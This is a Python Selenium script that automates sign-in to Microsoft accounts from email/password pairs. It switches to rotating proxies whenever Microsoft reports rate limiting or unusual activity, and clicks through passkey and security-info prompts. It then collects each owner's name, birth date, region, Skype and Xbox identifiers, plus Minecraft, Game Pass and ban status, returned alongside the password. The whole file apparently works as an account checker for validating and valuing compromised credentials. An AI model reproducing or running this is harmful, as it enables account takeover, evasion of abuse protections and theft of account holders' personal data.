from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time
import pycountry
from automation.driver import create_driver, mark_driver_success, mark_driver_fail
from automation.checker import run_all_checks

all_countries = {country.name for country in pycountry.countries}

MAX_PROXY_RETRIES = 3  # How many times to retry with a new proxy on rate limit


def _is_rate_limited(driver):
    """Check if Microsoft has rate-limited or blocked us."""
    try:
        page = driver.page_source
        if "Too Many Requests" in page:
            return True
        if "unusual activity" in page.lower():
            return True
        if "temporarily blocked" in page.lower():
            return True
    except:
        pass
    return False


def scrape_account_info(email: str, password: str) -> dict:
    """
    Scrape account info. Starts PROXYLESS first.
    If Microsoft rate-limits, switches to proxies and retries.
    """
    last_error = None

    for attempt in range(MAX_PROXY_RETRIES + 1):
        # First attempt: proxyless. Subsequent: use proxies with rotation.
        use_proxy = attempt > 0
        force_rotate = attempt > 1  # Rotate proxy on 3rd+ attempt
        if attempt > 0:
            print(f"🔄 Retry #{attempt} with proxy (rate limited proxyless)...")

        driver = create_driver(use_proxy=use_proxy, force_rotate=force_rotate)
        wait = WebDriverWait(driver, 20)

        try:
            result = _scrape_account_info_inner(driver, wait, email, password)

            # Check if we got rate limited
            if result and result.get("error") and "Too Many Requests" in result.get("error", ""):
                print(f"🚫 Rate limited on attempt {attempt + 1}")
                mark_driver_fail(driver)
                last_error = result
                driver.quit()
                continue

            # Check general rate limit on page
            if _is_rate_limited(driver):
                print(f"🚫 Rate limit detected on attempt {attempt + 1}")
                mark_driver_fail(driver)
                last_error = {"email": email, "error": "Rate limited by Microsoft"}
                driver.quit()
                continue

            # Success
            mark_driver_success(driver)
            driver.quit()
            return result

        except Exception as e:
            print(f"❌ Attempt {attempt + 1} failed: {e}")
            mark_driver_fail(driver)
            last_error = {"email": email, "error": str(e)}
            try:
                driver.quit()
            except:
                pass
            continue

    # All retries exhausted
    print(f"🚫 All {MAX_PROXY_RETRIES + 1} attempts failed for {email}")
    return last_error or {"email": email, "error": "All proxy attempts exhausted"}


def _scrape_account_info_inner(driver, wait, email: str, password: str) -> dict:
    """Inner scrape logic (single attempt with one driver/proxy)."""

    driver.get("https://login.live.com")
    email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
    email_input.send_keys(email)
    email_input.send_keys(Keys.RETURN)
    time.sleep(2)

    # ── Dismiss passkey / "Use a passkey" prompt if it appears ──
    try:
        # Microsoft shows "Sign in with a passkey" or "Use a passkey" modal
        # Look for cancel/dismiss buttons or "Other ways to sign in" / "Sign in another way"
        passkey_dismiss_selectors = [
            (By.XPATH, "//button[contains(text(), 'Cancel')]"),
            (By.XPATH, "//a[contains(text(), 'Cancel')]"),
            (By.XPATH, "//button[@aria-label='Cancel']"),
            (By.ID, "idBtn_Back"),
            (By.XPATH, "//span[contains(text(), 'Cancel')]"),
            (By.XPATH, "//button[contains(text(), 'No, thanks')]"),
            (By.XPATH, "//span[contains(text(), 'No, thanks')]"),
            (By.XPATH, "//a[contains(text(), 'No thanks')]"),
            (By.XPATH, "//button[contains(@data-testid, 'secondaryButton')]"),
        ]
        # Check if passkey prompt is showing
        page_source = driver.page_source.lower()
        if "passkey" in page_source or "use a passkey" in page_source or "sign in with" in page_source:
            print("🔑 Passkey prompt detected — dismissing...")
            for by, sel in passkey_dismiss_selectors:
                try:
                    btn = WebDriverWait(driver, 2).until(
                        EC.element_to_be_clickable((by, sel))
                    )
                    btn.click()
                    print(f"➡️ Dismissed passkey prompt via ({sel})")
                    time.sleep(1)
                    break
                except:
                    continue
    except:
        pass

    password_input = None

    try:
        password_input = WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.NAME, "passwd"))
        )
        print("✅ Password input appeared directly.")

    except TimeoutException:
        print("Password input not visible, checking for passkey/alternate buttons...")

        # ── Try dismissing passkey prompt again (sometimes appears after email submit) ──
        try:
            passkey_buttons = [
                (By.XPATH, "//button[contains(text(), 'Cancel')]"),
                (By.XPATH, "//span[contains(text(), 'Cancel')]"),
                (By.ID, "idBtn_Back"),
                (By.XPATH, "//button[contains(@data-testid, 'secondaryButton')]"),
                (By.XPATH, "//a[contains(text(), 'try another way')]"),
                (By.XPATH, "//a[contains(text(), 'Other ways')]"),
                (By.XPATH, "//span[contains(text(), 'No, thanks')]"),
                (By.XPATH, "//a[contains(text(), 'Skip')]"),
                (By.XPATH, "//button[contains(text(), 'Skip')]"),
                (By.XPATH, "//span[contains(text(), 'skip')]"),
            ]
            page_lower = driver.page_source.lower()
            if "passkey" in page_lower or "use a passkey" in page_lower or "create a passkey" in page_lower:
                print("🔑 Passkey prompt blocking password — trying to dismiss...")
                for by, sel in passkey_buttons:
                    try:
                        btn = WebDriverWait(driver, 2).until(EC.element_to_be_clickable((by, sel)))
                        btn.click()
                        print(f"➡️ Dismissed passkey via ({sel})")
                        time.sleep(1)
                        break
                    except:
                        continue
                # Check if password input appeared after dismissal
                try:
                    password_input = WebDriverWait(driver, 3).until(
                        EC.presence_of_element_located((By.NAME, "passwd"))
                    )
                    print("✅ Password input appeared after passkey dismissal.")
                except TimeoutException:
                    pass
        except:
            pass

        # ── Standard fallback: "Use your password" button ──
        if password_input is None:
            try:
                use_password_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                print("➡️ Clicked 'Use your password'")
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                pass

        # ── "Use a password instead" link (passkey alternative) ──
        if password_input is None:
            try:
                use_pass_instead = WebDriverWait(driver, 2).until(
                    EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), 'password instead')]"))
                )
                use_pass_instead.click()
                print("➡️ Clicked 'Use a password instead'")
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                pass

        # ── "Other ways to sign in" ──
        if password_input is None:

            try:
                other_ways_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Other ways to sign in')]"))
                )
                other_ways_btn.click()
                print("➡️ Clicked 'Other ways to sign in'")
                time.sleep(1)

                use_password_btn = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                print("➡️ Clicked 'Use your password' after 'Other ways'")
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )

            except TimeoutException:
                pass

        # ── "Sign in another way" (legacy credential picker) ──
        if password_input is None:
            try:
                switch_link = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.ID, "idA_PWD_SwitchToCredPicker"))
                )
                switch_link.click()
                print("➡️ Clicked 'Sign in another way'")
                time.sleep(1)

                use_password_btn = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                print("➡️ Clicked 'Use your password' after legacy switch")
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                pass

        # ── Final check: if still no password input, fail ──
        if password_input is None:
            print("❌ Failed to reach password input.")
            return {"email": email, "error": "Could not reach password input"}


    password_input.send_keys(password)
    password_input.send_keys(Keys.RETURN)
    time.sleep(3)  # slightly longer wait to let redirect settle


    # ── Check for wrong password (passwordEntry reappears) ──
    try:
        pw_error = driver.find_element(By.ID, "passwordEntry")
        if pw_error.is_displayed():
            print("❌ Password input still present — likely incorrect password.")
            return {"email": email, "error": "Incorrect password"}
    except:
        print("✅ Login successful. No password error detected.")


    # ── Rate limit check ──
    try:
        if "Too Many Requests" in driver.page_source:
            print("⚠️ 'Too Many Requests' detected — will retry with new proxy...")
            return {"email": email, "error": "Too Many Requests even after retry"}
    except:
        print("✅ No rate limit detected. Proceeding normally.")


    # ── Security info prompt ──
    try:
        security_next_btn = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.ID, "iLandingViewAction"))
        )
        print("🔒 Security info change screen found. Clicking 'Next'...")
        security_next_btn.click()
        time.sleep(2)
    except:
        print("✅ No security prompt detected. Continuing...")


    # ── "Stay signed in?" prompt — optional, not an error if missing ──
    try:
        stay_signed_in_yes = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'))
        )
        print("🔄 'Stay signed in?' prompt detected. Confirming...")
        stay_signed_in_yes.click()
        time.sleep(2)
    except:
        # Microsoft doesn't always show this prompt — that's fine, just continue
        print("✅ No 'Stay signed in?' prompt — continuing normally.")


    # ── Security modal ──
    try:
        close_button = WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Close"]'))
        )
        print("🛡️ Security modal detected. Closing it...")
        close_button.click()
        time.sleep(1)
    except:
        print("✅ No security modal found. Navigating to profile...")


    # ── Profile scraping ──
    print("🌐 Opening Microsoft profile page...")
    driver.get("https://account.microsoft.com/profile")
    time.sleep(3)

    name = "Name not found"
    dob = "DOB not found"
    region = "Region not found"

    try:
        # Wait for page to load something meaningful
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.TAG_NAME, "main"))
        )
        time.sleep(2)

        # ── Name: try multiple selectors in order ──
        name_selectors = [
            (By.ID,         "profile.profile-page.personal-section.full-name"),
            (By.XPATH,      "//div[contains(@id,'full-name')]"),
            (By.XPATH,      "//*[contains(@data-testid,'full-name')]"),
            (By.XPATH,      "//*[contains(@data-testid,'display-name')]"),
            (By.CSS_SELECTOR, "[class*='fullName']"),
            (By.CSS_SELECTOR, "[class*='full-name']"),
            (By.XPATH,      "//h1[contains(@class,'name')]"),
            # Broader fallback: first visible <h1> on the page
            (By.XPATH,      "//h1"),
        ]
        for by, sel in name_selectors:
            try:
                el = driver.find_element(by, sel)
                txt = el.text.strip()
                if txt:
                    name = txt
                    print(f"🔹 Captured name via ({sel}): {name}")
                    break
            except:
                continue

        # ── DOB & Region: scan all span.fui-Text + any visible spans ──
        all_spans = driver.find_elements(By.CSS_SELECTOR, 'span.fui-Text, span[class*="Text"]')
        for span in all_spans:
            try:
                text = span.text.strip()
                if not text:
                    continue
                # DOB: looks like MM/DD/YYYY or DD/MM/YYYY
                if dob == "DOB not found" and "/" in text:
                    parts = text.split(";")
                    for part in parts:
                        part = part.strip()
                        segments = part.split("/")
                        if len(segments) == 3 and all(s.isdigit() for s in segments):
                            dob = part
                            print(f"🔹 Cleaned DOB: {dob}")
                            break
                # Region
                if region == "Region not found" and text in all_countries:
                    region = text
                    print(f"🔹 Captured region: {region}")
            except:
                continue

        print(f"🔹 Final — name: {name}, dob: {dob}, region: {region}")

    except Exception as e:
        print(f"❌ Could not get account info: {e}")
        # Don't hard-fail — continue with defaults so the pipeline keeps going
        name = "Name not found"


    # ── Skype profile ──
    driver.get("https://secure.skype.com/portal/profile")
    print("✅ Loaded Skype profile")
    time.sleep(3)

    try:
        skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
        print(f"🔹Skype ID: {skype_id}")
    except:
        skype_id = "live:"

    try:
        skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
        print(f"🔹Skype email: {skype_email}")
    except:
        skype_email = email  # fallback

    # ── Xbox gamertag ──
    driver.get("https://www.xbox.com/en-IN/play/user")
    time.sleep(5)

    gamertag = "Not found"

    try:
        try:
            sign_in_btn = driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]')
            sign_in_btn.click()
            print(f"🔹Clicked sign_in_btn")
            time.sleep(7)
        except:
            pass

        try:
            account_btn = WebDriverWait(driver, 6).until(
                EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
            )
            account_btn.click()
            print(f"🔹Clicked account_btn")
            WebDriverWait(driver, 15).until(EC.url_contains("/play/user/"))

        except:
            pass

        url = driver.current_url
        if "/play/user/" in url:
            gamertag = url.split("/play/user/")[-1]
            gamertag = gamertag.replace("%20", " ").replace("%25", "%")
            print(f"🔹gamertag: {gamertag}")
    except:
        gamertag = "Error"

    # ── Run all account checks before closing driver ──
    print("🔍 Running account checks (Minecraft, Xbox, bans)...")
    try:
        checks = run_all_checks(driver)
    except Exception as e:
        print(f"⚠️ Checks failed: {e}")
        checks = {}

    return {
        "email":        email,
        "password":     password,
        "name":         name,
        "dob":          dob,
        "region":       region,
        "skype_id":     skype_id,
        "skype_email":  skype_email,
        "gamertag":     gamertag,
        # ── Checker results ──
        "mc_java":      checks.get("mc_java",     "⚠️ Skipped"),
        "mc_bedrock":   checks.get("mc_bedrock",  "⚠️ Skipped"),
        "mc_username":  checks.get("mc_username", "—"),
        "xbox_gp":      checks.get("xbox_gp",     "⚠️ Skipped"),
        "xbox_gpu":     checks.get("xbox_gpu",    "⚠️ Skipped"),
        "xbox_pc_gp":   checks.get("xbox_pc_gp",  "⚠️ Skipped"),
        "hypixel_ban":  checks.get("hypixel_ban", "⚠️ Skipped"),
        "donut_ban":    checks.get("donut_ban",   "⚠️ Skipped"),
    }
